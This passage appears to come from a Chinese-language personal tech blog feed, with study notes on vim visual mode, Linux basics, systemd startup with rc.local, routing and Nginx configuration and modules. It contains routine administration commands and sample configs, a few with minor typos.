<h3 id="Visual-模式"><a href="#Visual-模式" class="headerlink" title="Visual 模式"></a>Visual 模式</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">viw <span class="comment"># 选中单词</span></span><br><span class="line">vis <span class="comment"># 选中句子</span></span><br><span class="line">vip <span class="comment"># 选中段落</span></span><br><span class="line">vi( <span class="comment"># 选中括号中的内容</span></span><br><span class="line">vi[ <span class="comment"># 选中括号中的内容</span></span><br><span class="line">vit <span class="comment"># 选中标签中的内容</span></span><br></pre></td></tr></table></figure>

<p>可视化模块</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">v <span class="comment"># 面向字符</span></span><br><span class="line">V/shift + v <span class="comment"># 面向行</span></span><br><span class="line">ctrl + v <span class="comment"># 面向块</span></span><br></pre></td></tr></table></figure>

<h1 id="Apparmor"><a href="#Apparmor" class="headerlink" title="Apparmor"></a>Apparmor</h1><p>Linux 下的沙箱功能。</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><p>文件类型<br>d: 目录<br>-: 文件<br>l: 链接文件<br>b: 存储设备<br>c: 串行设备</p>
<p>文件权限<br>属主：读写执行<br>属组<br>其他用户</p>
<p>更改权限</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chgrp</span> 属组 文件</span><br><span class="line"><span class="built_in">chown</span> 属主 文件</span><br><span class="line"><span class="built_in">chown</span> 属主:属组 文件</span><br><span class="line"><span class="built_in">chmod</span> 775 文件或目录</span><br><span class="line"><span class="built_in">chmod</span> +/-/=</span><br><span class="line"><span class="built_in">chmod</span> u=rwx,o=r  (u,g,o,a 用户)</span><br></pre></td></tr></table></figure>

<h3 id="文件命令"><a href="#文件命令" class="headerlink" title="文件命令"></a>文件命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span>    <span class="comment"># 查看文件 -a -d -l</span></span><br><span class="line"><span class="built_in">cd</span>    <span class="comment"># 打开目录 </span></span><br><span class="line"><span class="built_in">pwd</span>   <span class="comment"># 当前目录 -P 实际路径</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="comment"># 创建目录 -m 配置权限 -p 递归创建所有目录</span></span><br><span class="line"><span class="built_in">rmdir</span> <span class="comment"># 删除目录 -p 递归删除所有目录</span></span><br><span class="line"><span class="built_in">cp</span>  <span class="comment"># 复制 -a pdr -d 复制链接的源文件 -f 强制 -i 覆盖时先询问 -l 硬链接操作 -p 复制文件和属性（备份常用） -r 递归复制  -s 复制为符号连接档 -u 如果目标旧才更新</span></span><br><span class="line"><span class="built_in">rm</span>  <span class="comment"># 删除 -f -i 询问 -r</span></span><br><span class="line"><span class="built_in">mv</span>  <span class="comment"># 移动 -f -i -u</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span>  <span class="comment"># 显示内容 -A vET -b 列行号 -E 结尾用$标出 -n 列行号，带空白行 -T 显示Tab -v 列出特殊字符</span></span><br><span class="line"><span class="built_in">tac</span>  <span class="comment"># 显示内容，倒序</span></span><br><span class="line"><span class="built_in">nl</span>   <span class="comment"># 显示内容，并标行号</span></span><br><span class="line">more <span class="comment"># 一页一页显示 / 搜索字符串 :f 显示行数和文件名 q 退出 b 往回翻页</span></span><br><span class="line">less <span class="comment"># 同上，但可以向前翻页 ? 向前搜索字符串 n 重复前一个搜索 N 反向重复前一个搜索</span></span><br><span class="line"><span class="built_in">head</span> <span class="comment"># 只看前几行</span></span><br><span class="line"><span class="built_in">tail</span> <span class="comment"># 只看后几行</span></span><br></pre></td></tr></table></figure>

<h3 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h3><p>一般 Linux 启动过程：</p>
<ol>
<li>Bios 启动</li>
<li>boot-loader 启动 </li>
<li>启动内核</li>
<li>内核初始化</li>
<li>初始化最后一步，启动pid &#x3D; 1的init进程</li>
</ol>
<p>init：是一个守护进程，相应的机制有 sysvinit upstart<br>sysvinit：是对 &#x2F;etc&#x2F;init.d 配置，service也是通过配置这一项实现开机启动的<br>upstart：这一机制在ubuntu用过一段时间后抛弃<br>systemd：用于克服sysvinit的缺点，功能强大，但是系统复杂</p>
<p>systemd 常用工具箱：</p>
<ul>
<li>systemctl</li>
<li>journalctl</li>
<li>notify</li>
<li>analyze</li>
<li>cgls</li>
<li>cgtop</li>
<li>loginctl</li>
<li>nspawn</li>
</ul>
<p>service 配置文件：</p>
<ul>
<li>WantedBy：服务所在的target，<a href="https://www.freedesktop.org/software/systemd/man/bootup.html#System%20Manager%20Bootup">官方有一张表</a>可以查看所有的选项。</li>
</ul>
<h4 id="Ubuntu-18-04"><a href="#Ubuntu-18-04" class="headerlink" title="Ubuntu 18.04"></a>Ubuntu 18.04</h4><p>在Ubuntu 18.04上完全使用SystemCtl来配置启动项，与之前的版本有很大区别，没有了<code>init.d</code>配置启动的方法。</p>
<p>打开<code>/lib/systemd/system/rc-local.service</code>，在后面追加：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[Install]  </span><br><span class="line">WantedBy=multi-user.target  </span><br><span class="line">Alias=rc-local.service</span><br></pre></td></tr></table></figure>

<p>编辑启动项配置文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/rc.local</span><br></pre></td></tr></table></figure>

<p>配置启动内容</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh -e</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;abc&quot;</span> &gt; /usr/local/test.log</span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>

<p>修改启动项的权限</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x /etc/rc.local</span><br></pre></td></tr></table></figure>

<p>打开启动项：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> rc-local</span><br></pre></td></tr></table></figure>

<p>其他SystemCtl命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload <span class="comment"># 重新加载配置文件</span></span><br></pre></td></tr></table></figure>

<h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><h4 id="设置静态地址"><a href="#设置静态地址" class="headerlink" title="设置静态地址"></a>设置静态地址</h4><p>修改文件<code>/etc/dhcp/dhcpd.conf</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">subnet 192.168.0.0 netmask 255.255.255.0 &#123;  option routers 192.168.0.1;  option subnet-mask 255.255.255.0;  range dynamic-bootp 192.168.0.100 192.168.0.200;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="临时修改路由顺序"><a href="#临时修改路由顺序" class="headerlink" title="临时修改路由顺序"></a>临时修改路由顺序</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">route del default gw 192.168.0.1 eth0route add default gw 192.168.0.1 dev eth0 metric 323</span><br></pre></td></tr></table></figure>

<h4 id="工具修改路由顺序"><a href="#工具修改路由顺序" class="headerlink" title="工具修改路由顺序"></a>工具修改路由顺序</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ifmetric wlan0 50</span><br></pre></td></tr></table></figure>

<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>bin: 存储常用命令<br>boot: linux启动核心文件<br>dev: 设备<br>etc: 配置<br>home: 用户目录<br>lib: 动态链接共享库<br>lost+found:系统非法关机后，存放的文件<br>media: U盘，光驱等设备<br>mnt: 临时挂载其他文件系统<br>opt: 额外安装软件所需的目录，如oracle数据库<br>proc: 系统内存映射，虚拟目录，存储在内存上<br>root: 管理员主目录<br>sbin: 管理员程序<br>selinux: Redhat&#x2F;CentOS特有，类似于防火墙<br>srv: 服务启动后需要提取的数据<br>sys: 文件系统sysfs，管理内核设备，进程，伪终端<br>tmp: 存放临时文件<br>usr: 重要，用户的应用程序，文件等，类似于Program Files文件夹<br>usr&#x2F;bin: 系统用户的应用程序<br>usr&#x2F;sbin: 超级用户的应用程序<br>usr&#x2F;src: 内核源代码的默认目录<br>var: 存放不断扩充的东西，例如日志，网站等<br>run: 临时文件系统，存储系统启动后的信息。该文件夹重启后清除</p>
<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><h3 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h3><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>~&#x2F;.bashrc</p>
<h3 id="程序的前后台切换"><a href="#程序的前后台切换" class="headerlink" title="程序的前后台切换"></a>程序的前后台切换</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 让程序在后台执行</span></span><br><span class="line">./command &amp;</span><br><span class="line"><span class="comment"># 查看后台程序</span></span><br><span class="line"><span class="built_in">jobs</span> -l</span><br><span class="line"><span class="comment"># 切换后台程序到前台</span></span><br><span class="line"><span class="built_in">fg</span> %[number]</span><br><span class="line"><span class="comment"># 终止后台程序</span></span><br><span class="line"><span class="built_in">kill</span> %[number]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换前台程序到后台，并暂停</span></span><br><span class="line">ctrl + z</span><br><span class="line"><span class="comment"># 后台程序由暂停变为继续执行</span></span><br><span class="line"><span class="built_in">bg</span> %[number]</span><br><span class="line"><span class="comment"># 不间断执行</span></span><br><span class="line"><span class="built_in">nohup</span></span><br><span class="line"><span class="comment"># 查看nohup日志</span></span><br><span class="line"><span class="built_in">tail</span> -fn 50 nohup.out</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>开发运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx</title>
    <url>/2020/11/26/%E8%BF%90%E7%BB%B4/Nginx/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p>IO 多路复用技术。</p>
<p>CPU 亲和：每个进程绑定一个核心，减少Cache Miss。</p>
<p>Sendfile：Httpd要将静态文件从内核空间传输到用户空间再转义到内核空间Socket。而Sendfile只在内核中传输，实现零拷贝。对于静态网站速度快。</p>
<p>压测工具：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一共 20000 个，每次并发 10 个</span></span><br><span class="line">ab -n 20000 -c 10 url </span><br></pre></td></tr></table></figure>

<h2 id="IO-多路复用"><a href="#IO-多路复用" class="headerlink" title="IO 多路复用"></a>IO 多路复用</h2><p>单线程或单进程同时监测若干个文件描述符是否可以执行IO操作的能力。Linux 系统下的IO操作分为：<code>阻塞IO</code>，<code>非阻塞IO</code>，<code>IO多路复用</code>，<code>信号驱动IO</code>，<code>异步IO</code>。其中<code>IO多路复用</code>又分为<code>Epoll</code>，<code>Select</code>，<code>Poll</code>。Windows下则使用<code>IOCP</code>技术。</p>
<p>Select Epoll：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* According to POSIX.1-2001, POSIX.1-2008 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* According to earlier standards */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">功能：等待一个或多个事件，在有一个或多个事件发生或经历一段指定的时间后才唤醒。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">参数：</span></span><br><span class="line"><span class="comment">fd_set 文件描述符组</span></span><br><span class="line"><span class="comment">    readfds, writefds, exceptfds 为 NULL 表示不启用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回值：就绪描述符的数目，超时返回0，出错返回-1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> nfds, fd_set *readfds, fd_set *writefds,</span></span><br><span class="line"><span class="params">            fd_set *exceptfds, <span class="keyword">struct</span> timeval *timeout)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pselect和select大体上是一样的，但有一些细节上的区别。</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pselect</span><span class="params">(<span class="type">int</span> nfds, fd_set *readfds, fd_set *writefds,</span></span><br><span class="line"><span class="params">            fd_set *exceptfds, <span class="type">const</span> <span class="keyword">struct</span> timespec *timeout,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">sigset_t</span> *sigmask)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_CLR</span><span class="params">(<span class="type">int</span> fd, fd_set *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">FD_ISSET</span><span class="params">(<span class="type">int</span> fd, fd_set *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_SET</span><span class="params">(<span class="type">int</span> fd, fd_set *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_ZERO</span><span class="params">(fd_set *<span class="built_in">set</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>Select 有数量限制，而Epoll没有限制。Select阻塞等待记录就绪的文件描述符，并上报应用程序。Nginx采用Epoll。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_create</span><span class="params">(<span class="type">int</span> size)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_ctl</span><span class="params">(<span class="type">int</span> epfd, <span class="type">int</span> op, <span class="type">int</span> fd, <span class="keyword">struct</span> epoll_event *event)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_wait</span><span class="params">(<span class="type">int</span> epfd, <span class="keyword">struct</span> epoll_event * events, <span class="type">int</span> maxevents, <span class="type">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Nginx-目录"><a href="#Nginx-目录" class="headerlink" title="Nginx 目录"></a>Nginx 目录</h2><p>日志轮转<br><code>/etc/logrotate.d/nginx</code> </p>
<p>配置文件</p>
<ul>
<li><code>/etc/nginx</code></li>
<li><code>/etc/nginx/nginx.conf</code>  启动载入</li>
<li><code>/etc/nginx/conf.d</code> </li>
<li><code>/etc/nginx/conf.d/default.conf</code> 旧版默认载入的网站</li>
<li><code>/etc/nginx/sites-enabled/default</code> 新版默认载入的网站</li>
</ul>
<p>CGI 配置</p>
<ul>
<li><code>/etc/nginx/fastcgi_params</code>  PHP</li>
<li><code>/etc/nginx/uwsgi_params</code>    </li>
<li><code>/etc/nginx/scgi_params</code></li>
</ul>
<p>编码转化映射</p>
<ul>
<li><code>/etc/nginx/koi-utf</code></li>
<li><code>/etc/nginx/koi-wih</code></li>
<li><code>/etc/nginx/win-utf</code></li>
</ul>
<p>Mime Types</p>
<ul>
<li><code>/etc/nginx/mime.types</code></li>
</ul>
<p>模块</p>
<ul>
<li><code>/usr/lib64/nginx/modules</code></li>
<li><code>/etc/nginx/modules</code></li>
</ul>
<p>命令</p>
<ul>
<li><code>/usr/sbin/nginx</code></li>
<li><code>/usr/sbin/nginx-debug</code></li>
</ul>
<p>帮助</p>
<ul>
<li><code>/usr/share/doc/nginx-*</code></li>
</ul>
<p>缓存</p>
<ul>
<li><code>/var/cache/nginx</code></li>
</ul>
<p>日志</p>
<ul>
<li><code>/var/log/nginx</code></li>
</ul>
<h2 id="Nginx-变量"><a href="#Nginx-变量" class="headerlink" title="Nginx 变量"></a>Nginx 变量</h2><p>主要分为三类：HTTP请求响应变量，Nginx内置变量，自定义变量</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内置变量，参考 log_format</span></span><br><span class="line">$<span class="attribute">remote_addr</span></span><br><span class="line"><span class="variable">$remote_user</span></span><br><span class="line"><span class="variable">$time_local</span></span><br><span class="line"><span class="variable">$request</span></span><br><span class="line"><span class="variable">$status</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP请求响应变量</span></span><br><span class="line"><span class="variable">$http_user_agent</span></span><br><span class="line"><span class="variable">$http_HEADER</span>  请求头</span><br><span class="line"><span class="variable">$send_http_HEADER</span>  响应头</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义变量 使用 Lua</span></span><br></pre></td></tr></table></figure>

<h2 id="Nginx-目录匹配"><a href="#Nginx-目录匹配" class="headerlink" title="Nginx 目录匹配"></a>Nginx 目录匹配</h2><p>location 匹配：</p>
<ul>
<li><code>=</code>   精确匹配，一旦匹配成功，停止搜索</li>
<li><code>^~</code>  前缀匹配，一旦匹配成功，停止搜索</li>
<li><code>~</code>   正则匹配，区分大小写</li>
<li><code>~*</code>  正则匹配，不区分大小写</li>
</ul>
<p>Rewrite：可以实现对url重写和重定向。使用正则表达式。用于访问跳转，SEO优化，后台维护，流量转发，伪静态。该功能依赖于 <code>rewrite</code> 模块。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> [=|~|~*|^~|@] /uri/ &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="attribute">locaton</span> / &#123;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span> /test/<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">locaton</span> /test &#123;</span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="comment"># 如无法访问，则调用 @java_page</span></span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@java_page</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> <span class="variable">@java_page</span> &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:8080;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># root和alias的区别：</span></span><br><span class="line"><span class="attribute">locaton</span> /code/ &#123;</span><br><span class="line">    <span class="attribute">root</span> /var/www/html/;</span><br><span class="line">    <span class="comment"># 寻找目录 /var/www/html/code/*</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /code &#123;</span><br><span class="line">    <span class="attribute">alias</span> /var/www/html;</span><br><span class="line">    <span class="comment"># 寻找目录 /var/www/html/*</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($<span class="attribute">http_user_agent</span> <span class="regexp">~* Chrome)</span>&#123;</span><br><span class="line">    <span class="attribute">rewrite</span> ~(.*)$ /chrome/<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span> /pages/maintain.html <span class="literal">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> <span class="regexp">~ \.jsp$</span> &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://mystream;</span><br><span class="line">    <span class="attribute">include</span> proxy_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>常用正则表达式：</p>
<ul>
<li><code>^</code>  匹配开始</li>
<li><code>$</code>  匹配结束</li>
<li><code>~</code>  区分大小写</li>
<li><code>~*</code> 不区分大小写</li>
<li><code>!</code>  不匹配</li>
<li><code>.</code>  匹配除换行符之外的字符</li>
<li><code>?</code>  0&#x2F;1 次匹配</li>
<li><code>+</code>  &gt;&#x3D;1 次匹配</li>
<li><code>*</code>  任意次匹配</li>
<li><code>|</code>  或操作</li>
<li><code>\d</code> 匹配数字</li>
<li><code>&#123;n&#125;</code> 重复n次</li>
<li><code>&#123;n,&#125;</code> 重复n次或更多次</li>
<li><code>[c]</code>  匹配字符c</li>
<li><code>[a-z]</code> 匹配a-z</li>
<li><code>\</code> 转义字符</li>
<li><code>()</code> 提取内容，放到 $1 $2 中</li>
</ul>
<h2 id="Nginx-配置文件"><a href="#Nginx-配置文件" class="headerlink" title="Nginx 配置文件"></a>Nginx 配置文件</h2><p><code>/etc/nginx/nginx.conf</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -t 配置文件检查 -c 配置文件路径</span></span><br><span class="line">nginx -t -c /etc/nginx/nginx.conf</span><br><span class="line">nginx -s reload -c /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">user</span> www-data;</span><br><span class="line"><span class="attribute">worker_processes</span> auto;</span><br><span class="line"><span class="attribute">pid</span> /run/nginx.pid;</span><br><span class="line"><span class="attribute">include</span> /etc/nginx/modules-enabled/<span class="regexp">*.conf</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">error_log</span> /var/log/nginx/<span class="literal">error</span>.log <span class="literal">warn</span>;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">768</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">tcp_nopush</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">tcp_nodelay</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">65</span>;</span><br><span class="line">    <span class="attribute">types_hash_max_size</span> <span class="number">2048</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/mime.types;</span><br><span class="line">    <span class="attribute">default_type</span> application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log;</span><br><span class="line">    <span class="attribute">error_log</span> /var/log/nginx/<span class="literal">error</span>.log;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模块</span></span><br><span class="line">    <span class="attribute">log_format</span> main <span class="string">&#x27;<span class="variable">$header_user_agent</span>&#x27;</span> <span class="string">&#x27;<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/<span class="regexp">*.conf</span>;</span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/sites-enabled/*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line">    <span class="comment"># listen 80 ssl default_server;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 一个server可以有多个location</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">        <span class="attribute">index</span> index.html index.htm;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> /<span class="number">404</span>.html;</span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;</span><br><span class="line">    <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://127.0.0.1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Nginx-模块"><a href="#Nginx-模块" class="headerlink" title="Nginx 模块"></a>Nginx 模块</h2><p>分为：官方模块，第三方模块。</p>
<ul>
<li>log_format 日志格式</li>
<li>stub_status Nginx 状态信息</li>
<li>random_index 返回随机页面</li>
<li>sub 替换HTTP内容</li>
<li>limit_conn 限制连接数量</li>
<li>limit_req 限制请求数量 </li>
<li>access 基于IP的访问控制</li>
<li>auth_basic 用户登录控制</li>
<li>sendfile sendfile方式，加快读取速率</li>
<li>tcp_nopush 提高传输效率</li>
<li>tcp_nodelay 提高实时率</li>
<li>gzip 压缩</li>
<li>add_header 添加头字段</li>
<li>valid_referers 修改referer</li>
<li>proxy_pass 代理</li>
<li>upstream 负载均衡</li>
<li>rewrite 匹配url</li>
</ul>
<h3 id="模块：log-format"><a href="#模块：log-format" class="headerlink" title="模块：log_format"></a>模块：<code>log_format</code></h3><p>格式化日志输出，支持<code>error.log</code> <code>access.log</code>。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: log_format name [escape=default|json] string ...;</span><br><span class="line">Defualt: log_format combined &quot;...&quot;;</span><br><span class="line">Context: http;  # 表示只能配置在http模块下</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># log_format 按照main的格式要求输出日志</span></span><br><span class="line">    <span class="comment"># 输出的变量包括 $header_user_agent $remote_addr $remote_user 等</span></span><br><span class="line">    <span class="attribute">log_format</span> main <span class="string">&#x27;<span class="variable">$header_user_agent</span>&#x27;</span> <span class="string">&#x27;<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span>&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：stub-status"><a href="#模块：stub-status" class="headerlink" title="模块：stub_status"></a>模块：<code>stub_status</code></h3><p>显示Nginx当前连接的信息。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: stub_status;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: server, location;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> /status &#123;</span><br><span class="line">        <span class="comment"># 输出Nginx状态</span></span><br><span class="line">        stub_status;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出说明：</p>
<ol>
<li>当前Nginx活跃的连接数；</li>
<li>握手总次数，总连接数，总请求数；</li>
<li>读写等的连接数。</li>
</ol>
<h3 id="模块：random-index"><a href="#模块：random-index" class="headerlink" title="模块：random_index"></a>模块：<code>random_index</code></h3><p>目录中随机选取一个文件作为主页，但是隐藏文件不会被选中。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: random_index on|off;</span><br><span class="line">Defualt: random_index off;</span><br><span class="line">Context: location;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="comment"># 随机选择主页</span></span><br><span class="line">        <span class="attribute">random_index</span> <span class="literal">on</span>;  </span><br><span class="line">        <span class="attribute">root</span> /var/www/html/html_set</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：sub"><a href="#模块：sub" class="headerlink" title="模块：sub"></a>模块：<code>sub</code></h3><p>用于替换HTTP内容。</p>
<p>语法规则（替换字符串）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: sub_filter old_string new_string;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>语法规则（判断页面是否有更新）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: sub_filter_last_modified on|off;</span><br><span class="line">Defualt: sub_filter_last_modified off;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>语法规则（匹配字符串，只匹配第一个，还是匹配所有）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: sub_filter_once on|off;</span><br><span class="line">Defualt: sub_filter_once off;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
